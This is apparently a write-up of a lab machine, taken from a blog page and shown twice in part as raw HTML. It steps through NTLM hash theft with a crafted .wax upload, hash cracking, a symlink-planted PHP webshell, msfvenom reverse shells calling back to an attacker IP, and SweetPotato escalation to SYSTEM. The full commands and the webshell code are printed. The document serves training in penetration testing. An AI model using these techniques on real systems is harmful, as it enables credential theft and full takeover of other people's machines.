class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there’s a webserver along with remote interface protocols being SSH and RDP. I doubt that we’ll have immediate access to these, so our entry point is probably going to be the webserver itself.</p>\n<p><img src=\"/images/vulnlab/media-vl/b.png\"></p>\n<p>The web application seems to be called “Promotion Studio”, or at least that could be the CMS being used on the backend. Wappalyzer did give us a bit of info on this website - specifically that it is an Apache webserver running PHP. Aside from that though, we don’t have much.</p>\n<p>Scrolling down however, we do have a noticeable result that may be of use to us.</p>\n<p><img src=\"/images/vulnlab/media-vl/c.png\"></p>\n<h1 id=\"NTLM-Theft-via-Windows-Media-Player\"><a href=\"#NTLM-Theft-via-Windows-Media-Player\" class=\"headerlink\" title=\"NTLM Theft via Windows Media Player\"></a>NTLM Theft via Windows Media Player</h1><p>There looks to be an upload functionality for the hiring team accepting applicants. The process is a bit different than sending a regular document, as it seems that the upload functionality itself is only accepting files that are compatible with Windows Media Player.</p>\n<p>Doing some research into the specific file format, it looks like the file extension that we’re looking for are either <code>.asf</code>, <code>.wma</code>, <code>.wax</code>, and a few others.</p>\n<p><img src=\"/images/vulnlab/media-vl/d.png\"></p>\n<p>The interesting part here is that <code>.wax</code> is a valid file extension for Windows Media Player, which is also a file extension that is exploitable by NTLM Theft. </p>\n<p>To those who don’t know, there are a large variety of files within Windows that are vulnerable to NTLM theft. This specific attack allows us to create a malicious file that will seem like a regular file, however it will instead perform a request to an endpoint that we control.</p>\n<p>In Windows whenever an attempt is made to a URI endpoint, the NetNTLM hash of the client account (the user making the request to the endpoint) is exchanged with the server that is hosting the endpoint. NTLM Theft allows us to poison the request that is made, and extract the NetNTLM hash of the user. This hash is effectively encrypted with the user’s plaintext password, giving us the opportunity to crack it.</p>\n<p>In our case, we can create a <code>.wax</code> Windows Media Player file and have it point to our attacker machine. If the <code>.wax</code> file is executed by a user on the backend of the machine, it poison the request and direct it to our MITM server that we stand up.</p>\n<p>To start, we’ll boot up Responder in a separate terminal tab.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo responder -I tun0</span><br><span class=\"line\">                                         __</span><br><span class=\"line\">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class=\"line\">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class=\"line\">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class=\"line\">                   |__|</span><br><span class=\"line\"></span><br><span class=\"line\">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br><span class=\"line\">......</span><br><span class=\"line\">[+] Listening for events...</span><br></pre></td></tr></table></figure>\n\n<p>Next, we’ll generate a few files using Greenwolf’s NTLM theft file generation <a href=\"https://github.com/Greenwolf/ntlm_theft\">here</a>. There is an abundance of different file formats you can use, however we’ll be using the <code>.wax</code> file type in our case.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 ntlm_theft.py -g wax -s 10.8.0.173 -f daz</span><br><span class=\"line\">Created: daz/daz.wax (OPEN)</span><br><span class=\"line\">Generation Complete.</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls -la daz       </span><br><span class=\"line\">total 12</span><br><span class=\"line\">drwxrwxr-x 2 daz daz 4096 Aug  7 22:10 .</span><br><span class=\"line\">drwxrwxr-x 7 daz daz 4096 Aug  7 22:10 ..</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz   54 Aug  7 22:10 daz.wax</span><br></pre></td></tr></table></figure>\n\n<p>All that’s left now is to transfer this file via the file upload functionality and wait for any NTLM hash exchanges that are captured in Responder.</p>\n<p>After about a minute or two of waiting, you should see a successfully captured hash appear.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] Listening for events...                                                                                                   </span><br><span class=\"line\"></span><br><span class=\"line\">[SMB] NTLMv2-SSP Client   : 10.10.115.42</span><br><span class=\"line\">[SMB] NTLMv2-SSP Username : MEDIA\\enox</span><br><span class=\"line\">[SMB] NTLMv2-SSP Hash     : enox::MEDIA:6698cf0238d6cc81:A7112EF24883911141FD714144D4B6FB:010100000000000000F00E5716E9DA014E8B[...snip...]0000000000                                          </span><br><span class=\"line\">[*] Skipping previously captured hash for MEDIA\\enox</span><br><span class=\"line\">[*] Skipping previously captured hash for MEDIA\\enox</span><br></pre></td></tr></table></figure>\n\n<p>We’ll crack this using hashcat along with its hash-identifier, which is 5600 for NetNTLM-v2 hashes.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 5600 enox_hash.txt /usr/share/wordlists/rockyou.txt </span><br><span class=\"line\">hashcat (v6.2.6) starting</span><br><span class=\"line\">......</span><br><span class=\"line\">310030002e0038002e0030002e003100370033000000000000000000:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 5600 (NetNTLMv2)</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to crack the hash for the <code>enox</code> user and can now use it to enumerate the target machine.</p>\n<p>Given that we now have credentials and there isn’t any form of LDAP or Kerberos on this machine, let’s just test a simple authentication attempt through SSH.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ssh enox@10.10.115.42</span><br><span class=\"line\">enox@10.10.115.42&#x27;s password:</span><br><span class=\"line\">Microsoft Windows [Version 10.0.20348.1970]</span><br><span class=\"line\">(c) Microsoft Corporation. All rights reserved.</span><br><span class=\"line\"></span><br><span class=\"line\">enox@MEDIA C:\\Users\\enox&gt;</span><br></pre></td></tr></table></figure>\n\n<p>The first user flag is within the <code>enox</code> user’s Desktop directory in their home folder.</p>\n<h1 id=\"Host-Reconnaissance\"><a href=\"#Host-Reconnaissance\" class=\"headerlink\" title=\"Host Reconnaissance\"></a>Host Reconnaissance</h1><p>Now that we have shell access as a user on the machine, let’s look around a bit. As I said before, there isn’t any form of LDAP or Kerberos on this machine, so our privilege escalation should rely and be exploiting completely through the shell that we currently have access to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          5/8/2021   1:20 AM                PerfLogs</span><br><span class=\"line\">d-r---        10/10/2023   6:32 AM                Program Files</span><br><span class=\"line\">d-----          5/8/2021   2:40 AM                Program Files (x86)</span><br><span class=\"line\">d-r---         10/2/2023  10:26 AM                Users</span><br><span class=\"line\">d-----        10/10/2023   6:41 AM                Windows</span><br><span class=\"line\">d-----         10/2/2023  11:03 AM                xampp</span><br></pre></td></tr></table></figure>\n\n<p>The <code>C:\\</code> drive does not seem to have anything obscenely useful in our case, as the <code>xampp</code> server is the webserver that we previously exploited.</p>\n<p>The first thing that jumped out to me (since we don’t seem to have any exploitable privileges) is the <code>xampp</code> webserver directory itself. Generally, files within a <code>xampp</code> webserver are hosted within <code>C:\\xampp\\htdocs</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\xampp\\htdocs&gt; echo &#x27;test&#x27; &gt; test.txt</span><br><span class=\"line\">out-file : Access to the path &#x27;C:\\xampp\\htdocs\\test.txt&#x27; is denied.</span><br><span class=\"line\">At line:1 char:1</span><br><span class=\"line\">+ echo &#x27;test&#x27; &gt; test.txt</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~</span><br><span class=\"line\">    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException</span><br><span class=\"line\">    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand</span><br></pre></td></tr></table></figure>\n\n<p>However as you’ll notice, it does not seem as though we have write access to this directory. At this point there wouldn’t be any form</p>\n<p>Something that also stood out to me after a bit of filesystem enumeration was how the <code>.wax</code> files were processed on the backend. In regular cases, this would generally be a user or a group of people from the team. There is however, a script to automate this in <code>C:\\Users\\enox\\Documents</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\enox\\Documents&gt; cat review.ps1</span><br><span class=\"line\">......</span><br><span class=\"line\">$todofile=&quot;C:\\\\Windows\\\\Tasks\\\\Uploads\\\\todo.txt&quot;</span><br><span class=\"line\">$mediaPlayerPath = &quot;C:\\Program Files (x86)\\Windows Media Player\\wmplayer.exe&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">while($True)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    if ((Get-Content -Path $todofile) -eq $null) &#123;</span><br><span class=\"line\">        Write-Host &quot;Todo is empty.&quot;</span><br><span class=\"line\">        Sleep 60 # Sleep for 60 seconds before rechecking</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>The interesting part is the <code>todofile</code> that is being commit to a variable name. Browsing to this file in <code>C:\\Windows\\Tasks\\Uploads</code> looks to have nothing in it, so we can assume that this text file is only populated when the review script is being ran.</p>\n<p>However in this directory, you’ll notice that there are a few directories alongside the text file. These directories may differ from you, as they seem to be relative to the uploaded file itself.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\Tasks\\uploads&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\Windows\\Tasks\\uploads</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----                                                </span><br><span class=\"line\">d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4</span><br><span class=\"line\">d-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd</span><br><span class=\"line\">-a----          8/7/2024   7:52 PM             70 todo.txt</span><br></pre></td></tr></table></figure>\n\n<p>I did some research into the review script itself to determine if this directory name that is created is based off any properties, and it seems to be static.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Read the first line of the file</span><br><span class=\"line\">$firstLine = Get-Content $FilePath -TotalCount 1</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract the values from the first line</span><br><span class=\"line\">if ($firstLine -match &#x27;Filename: (.+), Random Variable: (.+)&#x27;) &#123;</span><br><span class=\"line\">    $filename = $Matches[1]</span><br><span class=\"line\">    $randomVariable = $Matches[2]</span><br><span class=\"line\"></span><br><span class=\"line\">    # Create a custom object with the extracted values</span><br><span class=\"line\">    $repoValues = [PSCustomObject]@&#123;</span><br><span class=\"line\">        FileName = $filename</span><br><span class=\"line\">        RandomVariable = $randomVariable</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>The “randomVariable” variable seems to be static as far as I’m concerned, as there are no hashing algorithms that are used in the above code snippet. With this in mind, I decided to try and upload the same file twice through the web application.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4</span><br><span class=\"line\">d-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd</span><br><span class=\"line\">-a----          8/7/2024   7:53 PM              0 todo.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4</span><br><span class=\"line\">d-----          8/7/2024   8:26 PM                ca7a9f126960f1046ff6e022339b54bd</span><br><span class=\"line\">-a----          8/7/2024   8:26 PM             70 todo.txt</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Windows\\Tasks\\Uploads&gt; cat todo.txt</span><br><span class=\"line\">Filename: daz.aspx, Random Variable: ca7a9f126960f1046ff6e022339b54bd</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, it seems as though the directory that is created is a random variable, however it is static dependent on the name of the file itself. Furthermore, the <code>todo.txt</code> file is populated during the file upload process and further cements the name of the directory.</p>\n<h1 id=\"Exploiting-Arbitrary-Write-Privileges-via-Symlinks\"><a href=\"#Exploiting-Arbitrary-Write-Privileges-via-Symlinks\" class=\"headerlink\" title=\"Exploiting Arbitrary Write Privileges via Symlinks\"></a>Exploiting Arbitrary Write Privileges via Symlinks</h1><p>With that being said, there is an interesting exploit that we can perform. This involves creating a symlink, which is one of the more common ways that a lot of hackers exploit privilege escalation on Windows and Linux machines.</p>\n<p>A symlink is essentially a link between two objects on a filesystem. This can be files, directories, users, however generally when we refer to symlinks on filesystems we are noting the link of directories. This is similar to how mounts work in NFS shares, however this all occurs internally on the machine itself.</p>\n<p>Creating a symlink for a directory is relatively easy and involves utilizing the <code>mklink</code> command. We’ll specify the name of a directory that we want to establish the link on, and then the target directory we want it to be linked to. This will essentially function like a mount - meaning that all files that are created within the first directory will be automatically uploaded to the second directory at the endpoint of the symlink and vice versa. You can find more information about symlinks <a href=\"https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/\">here</a>.</p>\n<p>Since we know that the file specifically creates a static name for the directory, we can use this to create a symlink between objects (directories in our case) that are created with the specific name and link it to another directory. We can essentially send this anywhere, however in our case let’s try to specifically deliver it to the <code>C:\\xampp\\htdocs</code> directory that we previously did not have access to.</p>\n<p>Let’s first create a simple web shell and upload it via the web application upload functionality. You can find the webshell that I used below from <a href=\"https://www.revshells.com/\">revshells.com</a>.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form method=<span class=\"string\">&quot;GET&quot;</span> name=<span class=\"string\">&quot;&lt;?php echo basename(<span class=\"subst\">$_SERVER</span>[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">&quot;TEXT&quot;</span> name=<span class=\"string\">&quot;cmd&quot;</span> id=<span class=\"string\">&quot;cmd&quot;</span> size=<span class=\"string\">&quot;80&quot;</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">&quot;SUBMIT&quot;</span> value=<span class=\"string\">&quot;Execute&quot;</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;pre&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/pre&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;script&gt;document.<span class=\"title function_ invoke__\">getElementById</span>(<span class=\"string\">&quot;cmd&quot;</span>).<span class=\"title function_ invoke__\">focus</span>();&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>After this file is uploaded to the <code>Uploads</code> directory, let’s grab the name of the directory that is created.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\Tasks\\Uploads&gt; cat .\\todo.txt</span><br><span class=\"line\">Filename: webshell.php, Random Variable: a5f9e4b2c2e61ae07ffaec35aa299a7d</span><br></pre></td></tr></table></figure>\n\n<p>After this, I deleted the folder after it was created, as we have the “random” variable that is created. We can then use <code>mklink</code> to create a symbolic link between the name of the folder that will be created and the <code>C:\\xampp\\htdocs</code> directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\Tasks\\Uploads&gt; cmd /c &quot;mklink /J a5f9e4b2c2e61ae07ffaec35aa299a7d C:\\xampp\\htdocs&quot;</span><br><span class=\"line\">Junction created for a5f9e4b2c2e61ae07ffaec35aa299a7d &lt;&lt;===&gt;&gt; C:\\xampp\\htdocs</span><br></pre></td></tr></table></figure>\n\n<p>Remember that <code>mklink</code> is a CMD-specific command, meaning it will be unrecognized by PowerShell.</p>\n<p>Now that the link has been established, we’ll reupload the webshell with the same properties as we did previously. After it is uploaded, we’ll check <code>C:\\xampp\\htdocs</code> to see if the link worked accordingly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\Tasks\\Uploads&gt; cd C:\\xampp\\htdocs</span><br><span class=\"line\">PS C:\\xampp\\htdocs&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\xampp\\htdocs</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name           </span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----         10/2/2023  10:27 AM                assets</span><br><span class=\"line\">d-----         10/2/2023  10:27 AM                css</span><br><span class=\"line\">d-----         10/2/2023  10:27 AM                js</span><br><span class=\"line\">-a----        10/10/2023   5:00 AM          20563 index.php</span><br><span class=\"line\">-a----          8/7/2024   8:40 PM            348 webshell.php</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the webshell was uploaded successfully via the symlink! We were able to essentially write a webshell onto a directory that we previously did not have access to.</p>\n<p>If we browse to the PHP file path, you’ll find that we have access to a command execution page.</p>\n<p><img src=\"/images/vulnlab/media-vl/e.png\"></p>\n<p>It seems that we now have command execution as the <code>LOCAL SERVICE</code> account, meaning we can execute a payload to receive a netcat reverse shell as this user. I opted to use the Base64 encoded PowerShell reverse shell from revshells.com.</p>\n<p><img src=\"/images/vulnlab/media-vl/f.png\"></p>\n<h1 id=\"Restoring-LOCAL-SERVICE-Privileges\"><a href=\"#Restoring-LOCAL-SERVICE-Privileges\" class=\"headerlink\" title=\"Restoring LOCAL SERVICE Privileges\"></a>Restoring LOCAL SERVICE Privileges</h1><p>Normally since we now have access to the <code>LOCAL SERVICE</code> account, we should theoretically have the <code>SeImpersonatePrivilege</code> and <code>SeAssignPrimaryToken</code> privileges. This would grant us the ability to perform auth coercion to SYSTEM via a malicious named pipe.</p>\n<p>However if you’ll notice from your privileges, it does not seem as though we have that specific privilege handy.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\xampp\\htdocs&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                         State   </span><br><span class=\"line\">============================= =================================== ========</span><br><span class=\"line\">SeTcbPrivilege                Act as part of the operating system Disabled</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking            Enabled </span><br><span class=\"line\">SeCreateGlobalPrivilege       Create global objects               Enabled </span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled</span><br><span class=\"line\">SeTimeZonePrivilege           Change the time zone                Disabled</span><br></pre></td></tr></table></figure>\n\n<p>There is an easy fix for this, which involves restoring the default privileges set to the <code>LOCAL SERVICE</code> account. We can use <a href=\"https://github.com/itm4n/FullPowers.git\">this tool</a> created by itm4n, which will essentially perform the restoration for us.</p>\n<p>Let’s first create a MSFVENOM payload for another reverse shell, as we’ll need a new session as the restored <code>LOCAL SERVICE</code> account. I’ve been trying to practice exploiting machines without the use of C2’s, so we’ll just use regular netcat reverse shells for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9002 &gt; daz.exe</span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of exe file: 7168 bytes</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then transfer that to a directory on the remote filesystem using CURL onto your preferred directory (I made a directory within <code>C:\\temp</code>).</p>\n<p>We’ll then also CURL our compiled <code>FullPowers.exe</code> binary onto the host. This should leave us with the below two files.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\temp</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                   </span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a----          8/7/2024   9:11 PM           7168 daz.exe</span><br><span class=\"line\">-a----          8/7/2024   9:12 PM          36864 FullPowers.exe</span><br></pre></td></tr></table></figure>\n\n<p>We can then execute <code>FullPowers</code> and generate a new session as <code>LOCAL SERVICE</code> with our privileges restored with the below command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\FullPowers.exe -c &#x27;C:\\temp\\daz.exe&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/media-vl/g.png\"></p>\n<p>As you can see from the above, we now have <code>SeImpersonatePrivilege</code> and can exploit the SYSTEM auth coercion. I’ve explained this in a few other writeups, however I’ll give the rundown just for any new readers.</p>\n<p>Service accounts, by default, will have he <code>SeImpersonatePrivilege</code> token along with  <code>SeAssignPrimaryTokenPrivilege</code>. Having <code>SeImpersonatePrivilege</code> essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user. Exploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.</p>\n<p>We can use the Potato family of exploits to perform this evil named pipe and auth coercion exploit. Generally if AV is enabled we’d have to use a specific Potato exploit, however that does not seem to be the case here. I’ll use <a href=\"https://github.com/CCob/SweetPotato\">SweetPotato</a> for our case here.</p>\n<p>We’ll generate another MSFVENOM reverse shell on port 9003 and start up a netcat listener beforehand.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 &gt; daz2.exe </span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of exe file: 7168 bytes</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ rlwrap nc -lvnp 9003</span><br><span class=\"line\">listening on [any] 9003 ...</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then bring our compiled SweetPotato binary over to the remote host via CURL and execute it on our most recent <code>LOCAL SERVICE</code> session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\SweetPotato.exe -p &#x27;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27; -a &#x27;C:\\temp\\daz2.exe&#x27; -e EfsRpc</span><br><span class=\"line\">SweetPotato by @_EthicalChaos_</span><br><span class=\"line\">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class=\"line\">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class=\"line\">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class=\"line\">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class=\"line\">[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/64a97836-d71d-4171-86fb-4ee82adf0794/\\64a97836-d71d-4171-86fb-4ee82adf0794\\64a97836-d71d-4171-86fb-4ee82adf0794</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br></pre></td></tr></table></figure>\n\n<p>If we look at our reverse shell window, we can see that a shell was spawned as SYSTEM.</p>\n<p><img src=\"/images/vulnlab/media-vl/h.png\"></p>\n<p>Now that we have a shell as SYSTEM, this means we can effectively read the root flag in the Administrator’s Desktop directory, meaning we have completed this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine in particular was very fun, as the steps to learning symlinks was very helpful and is actually a relatively extensive vulnerability in terms of the actions that you can do. Initially, I had tried to create a symlink onto <code>C:\\Windows\\System32\\wbem</code> and hijack a DLL that is loaded when <code>systeminfo</code> is called, however it did not see as though that could be done. </p>\n<p>Regardless, this machine was great. Big props goes out to enox for creating it.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://support.microsoft.com/en-us/topic/file-types-supported-by-windows-media-player-32d9998e-dc8f-af54-7ba1-e996f74375d9\">https://support.microsoft.com/en-us/topic/file-types-supported-by-windows-media-player-32d9998e-dc8f-af54-7ba1-e996f74375d9</a><br><a href=\"https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/\">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</a><br><a href=\"https://github.com/Greenwolf/ntlm_theft\">https://github.com/Greenwolf/ntlm_theft</a><br><a href=\"https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/\">https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/itm4n/FullPowers\">https://github.com/itm4n/FullPowers</a><br><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Media is one of the last Medium machines that I’ll cover as a part of the medium machines chains. I still have to do the Linux machines along with Unintended (the only Linux-specific chain) but we’ll get to those later. This machine covers NTLM theft along with exploiting symlinks and restoring an IIS accounts vulnerable privileges.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>To start, let’s do our usual NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.115.42</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 21:54 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.115.42</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 997 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there’s a webserver along with remote interface protocols being SSH and RDP. I doubt that we’ll have immediate access to these, so our entry point is probably going to be the webserver itself.</p>\n<p><img src=\"/images/vulnlab/media-vl/b.png\"></p>\n<p>The web application seems to be called “Promotion Studio”, or at least that could be the CMS being used on the backend. Wappalyzer did give us a bit of info on this website - specifically that it is an Apache webserver running PHP. Aside from that though, we don’t have much.</p>\n<p>Scrolling down however, we do have a noticeable result that may be of use to us.</p>\n<p><img src=\"/images/vulnlab/media-vl/c.png\"></p>\n<h1 id=\"NTLM-Theft-via-Windows-Media-Player\"><a href=\"#NTLM-Theft-via-Windows-Media-Player\" class=\"headerlink\" title=\"NTLM Theft via Windows Media Player\"></a>NTLM Theft via Windows Media Player</h1><p>There looks to be an upload functionality for the hiring team accepting applicants. The process is a bit different than sending a regular document, as it seems that the upload functionality itself is only accepting files that are compatible with Windows Media Player.</p>\n<p>Doing some research into the specific file format, it looks like the file extension that we’re looking for are either <code>.asf</code>, <code>.wma</code>, <code>.wax</code>, and a few others.</p>\n<p><img src=\"/images/vulnlab/media-vl/d.png\"></p>\n<p>The interesting part here is that <code>.wax</code> is a valid file extension for Windows Media Player, which is also a file extension that is exploitable by NTLM Theft. </p>\n<p>To those who don’t know, there are a large variety of files within Windows that are vulnerable to NTLM theft. This specific attack allows us to create a malicious file that will seem like a regular file, however it will instead perform a request to an endpoint that we control.</p>\n<p>In Windows whenever an attempt is made to a URI endpoint, the NetNTLM hash of the client account (the user making the request to the endpoint) is exchanged with the server that is hosting the endpoint. NTLM Theft allows us to poison the request that is made, and extract the NetNTLM hash of the user. This hash is effectively encrypted with the user’s plaintext password, giving us the opportunity to crack it.</p>\n<p>In our case, we can create a <code>.wax</code> Windows Media Player file and have it point to our attacker machine. If the 